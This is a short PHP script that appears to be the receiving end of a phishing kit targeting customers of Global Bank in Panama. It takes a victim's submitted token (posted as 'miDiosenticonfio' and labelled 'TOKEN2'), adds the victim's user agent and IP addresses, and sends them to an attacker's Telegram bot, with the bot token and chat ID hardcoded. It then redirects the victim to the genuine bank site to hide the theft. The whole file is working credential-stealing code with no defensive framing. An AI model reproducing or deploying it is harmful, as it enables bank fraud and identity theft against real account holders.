<?php
session_start();
if( !empty($_POST['miDiosenticonfio'])){
    
    $_SESSION['TDOCUMENT'] = $_POST['miDiosenticonfio'];

    @$message = "GLOBALPANAMA\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'TOKEN2: '.$_SESSION['TDOCUMENT']."\n";

    $apiToken = "5738934159:AAFC5W8qNihaCUITtIHRoLtkSoC7VOcwRTk";

    $data = [
        'chat_id' => '5617210401',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{ header ('location: https://www.globalbank.com.pa/es'); exit(); }

@header ('refresh:1;url=https://www.globalbank.com.pa/es');
?>